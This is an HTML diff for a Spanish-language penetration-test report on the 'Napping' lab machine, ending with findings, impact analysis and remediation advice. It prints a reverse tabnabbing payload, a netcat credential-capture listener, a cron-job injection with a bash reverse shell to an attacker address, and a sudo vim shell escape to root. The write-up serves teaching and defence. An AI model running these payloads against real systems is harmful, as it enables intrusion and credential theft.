+        <div class="mock-window">
+            <div class="mock-bar"><span style="color:#ff2244">●</span> <span style="color:#ffdd00">●</span> <span style="color:#00ff66">●</span> &nbsp; http://192.168.56.101/</div>
+            <div class="mock-body" style="text-align:center;padding:20px;">
+                <div style="font-size:1.1rem;font-weight:bold;color:#fff;margin-bottom:10px;">Login</div>
+                <div style="font-size:.8rem;color:rgba(255,255,255,.6);margin-bottom:12px;">Please fill in your credentials to login.</div>
+                <div style="display:flex;flex-direction:column;gap:6px;max-width:200px;margin:0 auto;">
+                    <div style="display:flex;gap:8px;align-items:center;font-size:.78rem;"><span style="color:rgba(255,255,255,.5);min-width:70px;">Username</span><div style="flex:1;border:1px solid rgba(0,255,102,.3);height:22px;background:rgba(0,0,0,.3);"></div></div>
+                    <div style="display:flex;gap:8px;align-items:center;font-size:.78rem;"><span style="color:rgba(255,255,255,.5);min-width:70px;">Password</span><div style="flex:1;border:1px solid rgba(0,255,102,.3);height:22px;background:rgba(0,0,0,.3);"></div></div>
+                    <div style="border:1px solid rgba(0,255,102,.3);padding:4px;font-size:.78rem;text-align:center;color:#00ff66;margin-top:4px;">Login</div>
+                </div>
+                <div style="font-size:.72rem;color:rgba(255,255,255,.5);margin-top:10px;">Don't have an account? <span style="color:#00cfff;text-decoration:underline;">Sign up now.</span></div>
+            </div>
+        </div>
+        <!-- Cookie audit -->
+        <div class="mock-window">
+            <div class="mock-bar red"><span style="color:#ff2244">●</span> <span style="color:#ffdd00">●</span> <span style="color:#00ff66">●</span> &nbsp; DevTools → Storage → Cookies</div>
+            <div class="mock-body">
+                <div style="font-size:.72rem;color:rgba(0,255,102,.5);margin-bottom:10px;">// AUDITORÍA DE COOKIE DE SESIÓN</div>
+                <table style="width:100%;font-size:.75rem;border-collapse:collapse;">
+                    <tr style="border-bottom:1px solid rgba(0,255,102,.2);">
+                        <td style="padding:3px 6px;color:rgba(255,255,255,.5);">Nombre</td>
+                        <td style="color:#00cfff;padding:3px 6px;">PHPSESSID</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(0,255,102,.1);">
+                        <td style="padding:3px 6px;color:rgba(255,255,255,.5);">Domain</td>
+                        <td style="color:#fff;padding:3px 6px;">192.168.56.101</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(0,255,102,.1);background:rgba(255,34,68,.06);">
+                        <td style="padding:3px 6px;color:rgba(255,255,255,.5);">HttpOnly</td>
+                        <td style="color:#ff2244;padding:3px 6px;font-weight:bold;">false ⚠</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(0,255,102,.1);background:rgba(255,34,68,.06);">
+                        <td style="padding:3px 6px;color:rgba(255,255,255,.5);">Secure</td>
+                        <td style="color:#ff2244;padding:3px 6px;font-weight:bold;">false ⚠</td>
+                    </tr>
+                    <tr>
+                        <td style="padding:3px 6px;color:rgba(255,255,255,.5);">SameSite</td>
+                        <td style="color:#ffdd00;padding:3px 6px;">None</td>
+                    </tr>
+                </table>
+                <div style="margin-top:10px;font-size:.72rem;color:#ff2244;border:1px solid rgba(255,34,68,.3);padding:5px 8px;">
+                    ⚠ Sin HttpOnly + Sin Secure = Sesión robable vía JavaScript
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- DirBuster findings -->
+    <div class="terminal" style="margin-top:12px;">// OWASP DirBuster — Resultados con apache-user-enum-2.0.txt
+Files found with a 200 response:
+  /index.php    ← Formulario de login + autenticacion
+  /register.php ← Portal de registro de nuevos usuarios
+
+// Panel post-autenticacion descubierto:
+"Hello, Oswald1! Welcome to our free blog promotions site.
+ Please submit your link so that we can get started.
+ All links will be reviewed by our admin"   ← VECTOR: Admin revisa links externos</div>
+</section>
+
+<!-- ══ 06 REVERSE TABNABBING ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-tab" style="color:#ff2244"></i> 06 — Explotación: Reverse Tabnabbing</h2>
+
+    <p style="font-size:.85rem;color:rgba(255,255,255,.7);margin-bottom:12px;">El portal de blogs acepta links externos revisados por el administrador. Al abrir el link malicioso en una nueva pestaña, el script aprovecha <code style="color:#00ff66">window.opener</code> para redirigir silenciosamente la pestaña original a una página de login falsa controlada por el atacante.</p>
+
+    <!-- Tabnabbing visual flow -->
+    <div class="tabnab-explain">
+        <div class="tb-step">
+            <div class="ts-num">PASO 01</div>
+            <div class="ts-icon">📝</div>
+            <div class="ts-title">Envío del payload</div>
+            <div class="ts-desc">El atacante envía la URL del payload malicioso (<code style="color:#00ff66">http://192.168.56.102:8000/payload.html</code>) al formulario "Blog Link". El sistema lo manda al admin para revisión.</div>
+            <div class="ts-arrow">▶</div>
+        </div>
+        <div class="tb-step">
+            <div class="ts-num">PASO 02</div>
+            <div class="ts-icon">🖱️</div>
+            <div class="ts-title">Admin abre el link</div>
+            <div class="ts-desc">El administrador abre el link en una nueva pestaña. El script JavaScript se ejecuta automáticamente y detecta <code style="color:#00ff66">window.opener</code> disponible.</div>
+            <div class="ts-arrow">▶</div>
+        </div>
+        <div class="tb-step">
+            <div class="ts-num">PASO 03</div>
+            <div class="ts-icon">🔄</div>
+            <div class="ts-title">Redirección silenciosa</div>
+            <div class="ts-desc">El script redirige la pestaña <em>original</em> del admin a una página de login falsa (<code style="color:#00ff66">port 8080</code>) mientras el admin lee el payload en la nueva pestaña.</div>
+            <div class="ts-arrow">▶</div>
+        </div>
+        <div class="tb-step">
+            <div class="ts-num">PASO 04</div>
+            <div class="ts-icon">🎯</div>
+            <div class="ts-title">Captura de credenciales</div>
+            <div class="ts-desc">El admin vuelve a la pestaña "original" creyendo que su sesión expiró y re-ingresa credenciales. Netcat captura el POST en texto claro: <span style="color:#ff2244">daniel / C@ughtm3napping123</span></div>
+        </div>
+    </div>
+
+    <!-- payload code mock -->
+    <div class="mock-window" style="margin-top:14px;">
+        <div class="mock-bar"><span style="color:#ff2244">●</span> <span style="color:#ffdd00">●</span> <span style="color:#00ff66">●</span> &nbsp; payload.html — Código del exploit Reverse Tabnabbing</div>
+        <div class="mock-body">
+            <div class="terminal" style="margin:0;border:none;padding:10px 0;background:transparent;">
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      // Si la pestaña tiene un opener (padre), redirigirlo a login falso
+      if (window.opener)
+        window.opener.parent.location.replace('http://192.168.56.102:8080/home.html');
+      if (window.parent != window)
+        window.opener.parent.location.replace('http://192.168.56.102:8080/home.html');
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</div>
+        </div>
+    </div>
+
+    <div class="terminal" style="margin-top:10px;">
+# ATACANTE — Infraestructura desplegada
+$ python3 -m http.server 8000          # Sirve payload.html
+  Serving HTTP on 0.0.0.0 port 8000 ...
+
+$ nc -lvnp 8080                        # Listener captura credenciales
+  listening on [any] 8080 ...
+  connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 56020
+  POST /home.html HTTP/1.1
+  Host: 192.168.56.102:8080
+  Content-Type: application/x-www-form-urlencoded
+
+  username=daniel&password=C%40ughtm3napping123    ← CREDENCIALES CAPTURADAS
+
+# SSH FOOTHOLD obtenido
+$ ssh daniel@192.168.56.101
+  daniel@192.168.56.101's password: C@ughtm3napping123
+  Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)
+  daniel@napping:~$                    ← ACCESO INICIAL CONFIRMADO</div>
+</section>
+
+<!-- ══ 07 CRON JOB HIJACK ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-clock"></i> 07 — Movimiento Lateral: Cron Job Hijacking</h2>
+    <p style="font-size:.85rem;color:rgba(255,255,255,.7);margin-bottom:10px;">Desde la sesión de <strong style="color:#00ff66">daniel</strong>, se descubrió el directorio de <strong style="color:#ff6a00">adrian</strong> con el script <code style="color:#00ff66">query.py</code> que se ejecuta automáticamente cada 2 minutos vía cron job con los privilegios de adrian. El archivo tenía permisos de escritura globales — vulnerabilidad crítica.</p>
+
+    <!-- cron diagram -->
+    <div class="map-container">
+        <svg viewBox="0 0 680 130" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:680px;font-family:'Courier New',monospace;">
+            <rect width="680" height="130" fill="#050d0a"/>
+            <defs>
+                <marker id="a2" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ff6a00"/></marker>
+                <marker id="a3" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ff2244"/></marker>
+            </defs>
+            <text x="340" y="16" text-anchor="middle" fill="#5aac80" font-size="8" letter-spacing="2">CRON JOB HIJACKING — FLUJO DE EXPLOTACION</text>
+            <!-- SYSTEM CRON -->
+            <rect x="10" y="28" width="120" height="85" rx="4" fill="#0d1a10" stroke="#5aac80" stroke-width="1"/>
+            <text x="70" y="52" text-anchor="middle" fill="#5aac80" font-size="9" font-weight="bold">CRON DAEMON</text>
+            <text x="70" y="66" text-anchor="middle" fill="#5aac80" font-size="8">Ejecuta cada</text>
+            <text x="70" y="78" text-anchor="middle" fill="#ffdd00" font-size="10" font-weight="bold">2 minutos</text>
+            <text x="70" y="92" text-anchor="middle" fill="#5aac80" font-size="7">como usuario</text>
+            <text x="70" y="104" text-anchor="middle" fill="#ff6a00" font-size="8" font-weight="bold">adrian</text>
+            <line x1="130" y1="70" x2="165" y2="70" stroke="#5aac80" stroke-width="1.5" marker-end="url(#a2)"/>
+
+            <!-- query.py -->
+            <rect x="165" y="28" width="130" height="85" rx="4" fill="#1a0d04" stroke="#ff6a00" stroke-width="1.5"/>
+            <text x="230" y="48" text-anchor="middle" fill="#ff6a00" font-size="9" font-weight="bold">query.py</text>
+            <text x="230" y="62" text-anchor="middle" fill="#ff8833" font-size="7">-rw-rw-r-- (MUNDIAL)</text>
+            <text x="230" y="75" text-anchor="middle" fill="#ff2244" font-size="7" font-weight="bold">ESCRITURA GLOBAL ⚠</text>
+            <text x="230" y="90" text-anchor="middle" fill="#ff9966" font-size="7">import os</text>
+            <text x="230" y="103" text-anchor="middle" fill="#ff9966" font-size="7">os.system('connection.sh')</text>
+            <line x1="295" y1="70" x2="330" y2="70" stroke="#ff6a00" stroke-width="1.5" marker-end="url(#a2)"/>
+
+            <!-- connection.sh -->
+            <rect x="330" y="28" width="135" height="85" rx="4" fill="#1a0408" stroke="#ff2244" stroke-width="1.5"/>
+            <text x="397" y="48" text-anchor="middle" fill="#ff2244" font-size="9" font-weight="bold">connection.sh</text>
+            <text x="397" y="62" text-anchor="middle" fill="#ff5566" font-size="7">/dev/shm/ (RAM)</text>
+            <text x="397" y="76" text-anchor="middle" fill="#ff5566" font-size="8">bash -i &gt;&amp;</text>
+            <text x="397" y="88" text-anchor="middle" fill="#ff5566" font-size="7">/dev/tcp/192.168.56.102</text>
+            <text x="397" y="100" text-anchor="middle" fill="#ff5566" font-size="7">puerto 8080</text>
+            <line x1="465" y1="70" x2="500" y2="70" stroke="#ff2244" stroke-width="1.5" marker-end="url(#a3)"/>
+
+            <!-- result -->
+            <rect x="500" y="28" width="165" height="85" rx="4" fill="#200408" stroke="#ff2244" stroke-width="2"/>
+            <text x="582" y="52" text-anchor="middle" fill="#ff2244" font-size="11">💀</text>
+            <text x="582" y="68" text-anchor="middle" fill="#ff2244" font-size="9" font-weight="bold">REVERSE SHELL</text>
+            <text x="582" y="82" text-anchor="middle" fill="#ff5566" font-size="8">adrian@napping</text>
+            <text x="582" y="96" text-anchor="middle" fill="#ff5566" font-size="7">Movimiento lateral exitoso</text>
+            <text x="582" y="108" text-anchor="middle" fill="#5aac80" font-size="7">TTY estabilizada con python3</text>
+        </svg>
+    </div>
+
+    <div class="terminal" style="margin-top:10px;">
+# Desde daniel@napping — Descubrimiento
+$ ls -l /home/adrian/
+-rw-rw-r-- 1 adrian administrators  541  query.py      ← ESCRITURA GLOBAL
+-rw-rw-r-- 1 adrian adrian         2752  site_status.txt
+
+# Inyección de código en query.py
+$ nano /home/adrian/query.py
+  import os
+  os.system('/usr/bin/bash /dev/shm/connection.sh')  ← INYECTADO
+
+# Script reverse shell en /dev/shm/ (memoria temporal)
+$ cat /dev/shm/connection.sh
+  #!/bin/bash
+  bash -c 'bash -i >& /dev/tcp/192.168.56.102/8080 0>&1'
+
+# Resultado — Al activarse el cron:
+$ nc -lvnp 8080
+  connect to [192.168.56.102] from [192.168.56.101] 56060
+  bash: cannot set terminal process group: Inappropriate ioctl
+  adrian@napping:~$              ← SHELL COMO ADRIAN OBTENIDA</div>
+</section>
+
+<!-- ══ 08 VIM SUDO BREAKOUT ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-terminal" style="color:#ff2244"></i> 08 — Escalada de Privilegios: vim sudo Breakout</h2>
+    <p style="font-size:.85rem;color:rgba(255,255,255,.7);margin-bottom:10px;">Desde la sesión de <strong style="color:#ff6a00">adrian</strong>, se ejecutó <code style="color:#00ff66">sudo -l</code> revelando una configuración insegura crítica: <strong style="color:#ff2244">vim puede ejecutarse como root sin contraseña (NOPASSWD)</strong>. Los editores de texto interactivos permiten abrir un shell desde su interior.</p>
+
+    <div class="terminal">
+# Como adrian — Auditoría de privilegios
+$ export TERM=xterm
+$ sudo -l
+  Matching Defaults entries for adrian on napping:
+      env_reset, mail_badpass,
+      secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+  User adrian may run the following commands on napping:
+      (root) NOPASSWD: /usr/bin/vim        ← CRÍTICO: vim como root sin contraseña
+
+# EXPLOTACIÓN — Shell Breakout desde vim
+$ sudo /usr/bin/vim -c ':!/bin/sh'
+  # vim ejecuta el comando :!/bin/sh → abre shell del proceso padre (root)
+
+# Resultado
+# whoami
+root                                     ← ESCALADA COMPLETADA
+#</div>
+
+    <!-- vim breakout visual -->
+    <div class="map-container" style="margin-top:12px;">
+        <svg viewBox="0 0 680 120" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:680px;font-family:'Courier New',monospace;">
+            <rect width="680" height="120" fill="#050d0a"/>
+            <defs>
+                <marker id="av" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ff2244"/></marker>
+            </defs>
+            <text x="340" y="16" text-anchor="middle" fill="#5aac80" font-size="8" letter-spacing="2">VIM SUDO BREAKOUT — ESCALADA DE PRIVILEGIOS</text>
+            <!-- sudo cmd -->
+            <rect x="15" y="28" width="145" height="75" rx="4" fill="#0d1a10" stroke="#ff6a00" stroke-width="1.5"/>
+            <text x="87" y="52" text-anchor="middle" fill="#ff6a00" font-size="9" font-weight="bold">sudo vim</text>
+            <text x="87" y="66" text-anchor="middle" fill="#ff8833" font-size="8">NOPASSWD en sudoers</text>
+            <text x="87" y="80" text-anchor="middle" fill="#ff9966" font-size="7">sin autenticacion</text>
+            <text x="87" y="93" text-anchor="middle" fill="#5aac80" font-size="7">proceso padre: root</text>
+            <line x1="160" y1="65" x2="200" y2="65" stroke="#ff6a00" stroke-width="1.5" marker-end="url(#av)"/>
+            <!-- vim running as root -->
+            <rect x="200" y="28" width="160" height="75" rx="4" fill="#1a0408" stroke="#ff2244" stroke-width="1.5"/>
+            <text x="280" y="48" text-anchor="middle" fill="#ff2244" font-size="9" font-weight="bold">/usr/bin/vim</text>
+            <text x="280" y="62" text-anchor="middle" fill="#ff5566" font-size="8">proceso ejecutandose como root</text>
+            <text x="280" y="76" text-anchor="middle" fill="#ff5566" font-size="7">directiva: -c ':!/bin/sh'</text>
+            <text x="280" y="90" text-anchor="middle" fill="#ff8888" font-size="7">invoca sub-proceso /bin/sh</text>
+            <line x1="360" y1="65" x2="400" y2="65" stroke="#ff2244" stroke-width="1.5" marker-end="url(#av)"/>
+            <!-- sh inherits root -->
+            <rect x="400" y="28" width="145" height="75" rx="4" fill="#1a0408" stroke="#ff2244" stroke-width="1.5"/>
+            <text x="472" y="48" text-anchor="middle" fill="#ff2244" font-size="9" font-weight="bold">/bin/sh heredado</text>
+            <text x="472" y="62" text-anchor="middle" fill="#ff5566" font-size="8">hereda privilegios del padre</text>
+            <text x="472" y="76" text-anchor="middle" fill="#ff5566" font-size="7">UID=0 → root</text>
+            <text x="472" y="90" text-anchor="middle" fill="#ff8888" font-size="7">whoami = root</text>
+            <line x1="545" y1="65" x2="580" y2="65" stroke="#ff2244" stroke-width="2" marker-end="url(#av)"/>
+            <!-- result -->
+            <rect x="580" y="28" width="85" height="75" rx="4" fill="#200408" stroke="#ff2244" stroke-width="2"/>
+            <text x="622" y="55" text-anchor="middle" fill="#ff2244" font-size="18">💀</text>
+            <text x="622" y="72" text-anchor="middle" fill="#ff2244" font-size="10" font-weight="bold">#ROOT</text>
+            <text x="622" y="87" text-anchor="middle" fill="#ff5566" font-size="7">TOTAL PWNED</text>
+        </svg>
+    </div>
+</section>
+
+<!-- ══ 09 POST-EXPLOTACIÓN ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-database" style="color:#ff2244"></i> 09 — Post-Explotación: Credenciales MySQL Expuestas</h2>
+    <p style="font-size:.85rem;color:rgba(255,255,255,.7);margin-bottom:10px;">Con acceso root, se exploró <code style="color:#00ff66">/root/</code> y se descubrió <code style="color:#00ff66">del_users.py</code> con credenciales de base de datos MySQL en texto plano (hardcoded) y sentencias destructivas <code style="color:#ff2244">TRUNCATE TABLE users</code>.</p>
+
+    <div class="terminal red">
+# root@napping — Post-explotacion
+# cd /root && ls
+  del_links.py  del_users.py  nap.py  root.txt  snap
+
+# more del_users.py
+  import mysql.connector
+
+  mydb = mysql.connector.connect(
+    host="localhost",
+    user="adrian",
+    password="P@sswr0d456",     ← CREDENCIALES EN TEXTO PLANO
+    database="website"
+  )
+
+  db.close()
+  cute("TRUNCATE TABLE users")  ← SENTENCIA DESTRUCTIVA: borra todos los usuarios</div>
+
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:14px;">
+        <div style="border:1px solid rgba(255,34,68,.3);background:rgba(255,34,68,.04);padding:16px;">
+            <div style="font-size:.65rem;color:rgba(255,34,68,.7);letter-spacing:.15em;margin-bottom:6px;">CREDENCIAL EXPUESTA</div>
+            <div style="font-size:.85rem;color:#fff;margin-bottom:3px;">Usuario DB: <span style="color:#ff2244;font-weight:bold;">adrian</span></div>
+            <div style="font-size:.85rem;color:#fff;margin-bottom:3px;">Contraseña: <span style="color:#ff2244;font-weight:bold;">P@sswr0d456</span></div>
+            <div style="font-size:.85rem;color:#fff;">Base de datos: <span style="color:#ff2244;font-weight:bold;">website</span></div>
+            <div style="font-size:.72rem;color:rgba(255,34,68,.7);margin-top:8px;">Hardcoded en código fuente — accesible por cualquier usuario con acceso root</div>
+        </div>
+        <div style="border:1px solid rgba(255,34,68,.3);background:rgba(255,34,68,.04);padding:16px;">
+            <div style="font-size:.65rem;color:rgba(255,34,68,.7);letter-spacing:.15em;margin-bottom:6px;">SENTENCIA DESTRUCTIVA</div>
+            <div style="font-size:.88rem;color:#ff2244;font-weight:bold;font-family:'Courier New',monospace;margin-bottom:6px;">TRUNCATE TABLE users</div>
+            <div style="font-size:.8rem;color:rgba(255,255,255,.75);">Elimina <strong>todos</strong> los registros de usuarios del portal de blogs de forma irreversible. Pérdida masiva de datos corporativos.</div>
+        </div>
+        <div style="border:1px solid rgba(255,221,0,.2);background:rgba(255,221,0,.03);padding:16px;">
+            <div style="font-size:.65rem;color:rgba(255,221,0,.7);letter-spacing:.15em;margin-bottom:6px;">ARCHIVOS CRÍTICOS EN /root</div>
+            <div style="font-size:.8rem;color:rgba(255,255,255,.75);line-height:1.7;">
+                <span style="color:#ff2244;">del_users.py</span> — Elimina usuarios BD<br>
+                <span style="color:#ff2244;">del_links.py</span> — Elimina links BD<br>
+                <span style="color:#ffdd00;">nap.py</span> — Lógica del portal<br>
+                <span style="color:#5aac80;">root.txt</span> — Flag de root
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ══ 10 HALLAZGOS ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-bug"></i> 10 — Tabla de Hallazgos</h2>
+    <div class="vuln-dist">
+        <div class="vd crit"><div class="vn">2</div><div class="vl">CRÍTICAS</div></div>
+        <div class="vd alto"><div class="vn">2</div><div class="vl">ALTAS</div></div>
+    </div>
+    <table class="vuln-table">
+        <tr><th>ID</th><th>VULNERABILIDAD</th><th>VECTOR</th><th>SEVERIDAD</th><th>RECOMENDACIÓN</th></tr>
+        <tr>
+            <td class="vid">VUL-01</td>
+            <td>Reverse Tabnabbing — window.opener sin restriccion en enlaces externos del portal de blogs</td>
+            <td style="color:#00cfff;font-size:.75rem;">HTTP / Client-Side</td>
+            <td><span class="badge badge-crit">CRÍTICA</span></td>
+            <td style="font-size:.78rem;">Agregar <code style="color:#00ff66">rel="noopener noreferrer"</code> en todos los &lt;a&gt; externos</td>
+        </tr>
+        <tr>
+            <td class="vid">VUL-02</td>
+            <td>Permisos inseguros en script cron — query.py con escritura global (-rw-rw-r--) ejecutado por adrian</td>
+            <td style="color:#00cfff;font-size:.75rem;">Cron Job / OS</td>
+            <td><span class="badge badge-alto">ALTA</span></td>
+            <td style="font-size:.78rem;">Aplicar principio de menor privilegio: <code style="color:#00ff66">chmod 644 query.py</code></td>
+        </tr>
+        <tr>
+            <td class="vid">VUL-03</td>
+            <td>Sudoers Misconfiguration — adrian puede ejecutar /usr/bin/vim como root sin contrasena (NOPASSWD)</td>
+            <td style="color:#00cfff;font-size:.75rem;">sudo / Privesc</td>
+            <td><span class="badge badge-crit">CRÍTICA</span></td>
+            <td style="font-size:.78rem;">Eliminar directiva NOPASSWD en /etc/sudoers · Usar <code style="color:#00ff66">sudoedit</code></td>
+        </tr>
+        <tr>
+            <td class="vid">VUL-04</td>
+            <td>Hardcoded Secrets — Credenciales MySQL (usuario adrian / P@sswr0d456) en texto plano en del_users.py + TRUNCATE TABLE</td>
+            <td style="color:#00cfff;font-size:.75rem;">/root — Post-explot.</td>
+            <td><span class="badge badge-alto">ALTA</span></td>
+            <td style="font-size:.78rem;">Variables de entorno o gestor de secretos (HashiCorp Vault). Eliminar credenciales del código.</td>
+        </tr>
+    </table>
+</section>
+
+<!-- ══ 11 KILL CHAIN ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-link"></i> 11 — Kill Chain Completa — 4 Pasos al Root</h2>
+    <div class="kc-wrap">
+        <div class="kc-step">
+            <div class="kn">01 — WEB</div>
+            <div class="ki">🔖</div>
+            <div class="kt">Tabnabbing</div>
+            <div class="kd">Blog Link enviado<br>window.opener<br>payload.html<br>Login falso :8080</div>
+        </div>
+        <div class="kc-step">
+            <div class="kn">02 — CRED</div>
+            <div class="ki">🔑</div>
+            <div class="kt">Credenciales</div>
+            <div class="kd">Netcat captura POST<br>daniel<br>C@ughtm3napping123<br>texto plano</div>
+        </div>
+        <div class="kc-step">
+            <div class="kn">03 — SSH</div>
+            <div class="ki">💻</div>
+            <div class="kt">Shell daniel</div>
+            <div class="kd">ssh daniel@.56.101<br>Foothold obtenido<br>Ubuntu 20.04.3<br>puerto 22</div>
+        </div>
+        <div class="kc-step">
+            <div class="kn">04 — CRON</div>
+            <div class="ki">⏱️</div>
+            <div class="kt">Cron Hijack</div>
+            <div class="kd">query.py inyectado<br>os.system() RCE<br>connection.sh<br>reverse shell → adrian</div>
+        </div>
+        <div class="kc-step">
+            <div class="kn">05 — SUDO</div>
+            <div class="ki">⚡</div>
+            <div class="kt">vim Breakout</div>
+            <div class="kd">sudo -l audit<br>NOPASSWD vim<br>sudo vim -c':!/bin/sh'<br>shell root heredada</div>
+        </div>
+        <div class="kc-root">
+            <div class="ki">💀</div>
+            <div class="kt">#ROOT</div>
+            <div class="kd">whoami = root<br>Compromiso total<br>del_users.py<br>MySQL creds</div>
+        </div>
+    </div>
+</section>
+
+<!-- ══ 12 CIA ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-shield-alt"></i> 12 — Análisis de Impacto (Modelo CIA)</h2>
+    <div class="cia-grid">
+        <div class="cia-card conf">
+            <div class="cia-letter">C</div>
+            <div class="cia-title">Confidencialidad</div>
+            <span class="cia-badge">IMPACTO: CRÍTICO</span>
+            <div class="cia-text">Credenciales interceptadas vía Tabnabbing. Con root: lectura de /etc/shadow, código fuente, BD MySQL completa y credenciales hardcoded de adrian. Exfiltración total de datos corporativos sin restricción.</div>
+        </div>
+        <div class="cia-card intg">
+            <div class="cia-letter">I</div>
+            <div class="cia-title">Integridad</div>
+            <span class="cia-badge">IMPACTO: CRÍTICO</span>
+            <div class="cia-text">Inyección de código en query.py demuestra modificación de procesos automatizados sin detección. Con root: modificar binarios, logs, configs y ejecutar TRUNCATE TABLE para destruir datos de usuarios.</div>
+        </div>
+        <div class="cia-card avail">
+            <div class="cia-letter">A</div>
+            <div class="cia-title">Disponibilidad</div>
+            <span class="cia-badge">IMPACTO: CRÍTICO</span>
+            <div class="cia-text">Control total sobre Apache, SSH y MySQL. TRUNCATE TABLE users = pérdida irrecuperable de todos los usuarios del portal. Posible detención total del servicio o destrucción del sistema de archivos.</div>
+        </div>
+    </div>
+</section>
+
+<!-- ══ 13 RECOMENDACIONES ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-tools"></i> 13 — Recomendaciones Técnicas</h2>
+    <div class="rec-list">
+        <div class="rec-item">
+            <div class="rec-id"><span class="rec-badge crit">CRÍTICO</span><span class="rec-num">REC-01</span></div>
+            <div>
+                <div class="rec-title">Mitigación Reverse Tabnabbing — rel="noopener noreferrer"</div>
+                <div class="rec-desc">Modificar todos los hipervínculos externos en el portal. Agregar <code>rel="noopener noreferrer"</code> a toda etiqueta &lt;a target="_blank"&gt;. Esto impide que la página maliciosa acceda al objeto <code>window.opener</code> de la pestaña original.</div>
+            </div>
+        </div>
+        <div class="rec-item">
+            <div class="rec-id"><span class="rec-badge alto">ALTO</span><span class="rec-num">REC-02</span></div>
+            <div>
+                <div class="rec-title">Principio de Menor Privilegio — Permisos de scripts cron</div>
+                <div class="rec-desc">Restringir permisos de escritura de <code>query.py</code>: <code>chmod 644 /home/adrian/query.py</code>. Solo el propietario legítimo (adrian) o root deben poder modificarlo. Auditar periódicamente todos los scripts ejecutados por cron jobs.</div>
+            </div>
+        </div>
+        <div class="rec-item">
+            <div class="rec-id"><span class="rec-badge crit">CRÍTICO</span><span class="rec-num">REC-03</span></div>
+            <div>
+                <div class="rec-title">Auditoría y depuración de políticas Sudo</div>
+                <div class="rec-desc">Eliminar inmediatamente la directiva <code>NOPASSWD</code> para <code>/usr/bin/vim</code> en <code>/etc/sudoers</code>. Los editores de texto interactivos permiten escape a shell. Sustituir por <code>sudoedit</code> con autenticación obligatoria o MFA.</div>
+            </div>
+        </div>
+        <div class="rec-item">
+            <div class="rec-id"><span class="rec-badge alto">ALTO</span><span class="rec-num">REC-04</span></div>
+            <div>
+                <div class="rec-title">Erradicación de Hardcoded Credentials</div>
+                <div class="rec-desc">Eliminar las credenciales MySQL de <code>del_users.py</code>. Implementar variables de entorno protegidas (<code>os.environ.get('DB_PASS')</code>) o integrar HashiCorp Vault / AWS Secrets Manager. Prohibir por política el almacenamiento de contraseñas en código fuente.</div>
+            </div>
+        </div>
+        <div class="rec-item">
+            <div class="rec-id"><span class="rec-badge alto">ALTO</span><span class="rec-num">REC-05</span></div>
+            <div>
+                <div class="rec-title">Hardening de cookies de sesión</div>
+                <div class="rec-desc">Configurar PHPSESSID con flags de seguridad: <code>session.cookie_httponly = 1</code> y <code>session.cookie_secure = 1</code> en <code>php.ini</code>. Agregar <code>SameSite=Strict</code> para prevenir ataques de sesión vía JavaScript.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ══ 14 ROADMAP ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-road"></i> 14 — Roadmap de Remediación</h2>
+    <div class="roadmap-grid">
+        <div class="rm-col" style="border-top:2px solid #ff2244;">
+            <span class="rm-phase imm">⚡ INMEDIATO — 72 HRS</span>
+            <div class="rm-item"><i class="fas fa-times-circle"></i>Agregar noopener noreferrer</div>
+            <div class="rm-item"><i class="fas fa-times-circle"></i>Eliminar NOPASSWD vim en sudoers</div>
+            <div class="rm-item"><i class="fas fa-times-circle"></i>Eliminar credenciales hardcoded</div>
+        </div>
+        <div class="rm-col" style="border-top:2px solid #ff6a00;">
+            <span class="rm-phase short">⚠ CORTO PLAZO — MES 1</span>
+            <div class="rm-item"><i class="fas fa-lock"></i>chmod 644 en query.py</div>
+            <div class="rm-item"><i class="fas fa-lock"></i>Auditar todos los cron jobs</div>
+            <div class="rm-item"><i class="fas fa-lock"></i>HttpOnly + Secure en cookies</div>
+        </div>
+        <div class="rm-col" style="border-top:2px solid #00ff66;">
+            <span class="rm-phase lng">∞ LARGO PLAZO</span>
+            <div class="rm-item"><i class="fas fa-eye"></i>Gestor de secretos (Vault)</div>
+            <div class="rm-item"><i class="fas fa-eye"></i>SIEM + monitoreo de sudo</div>
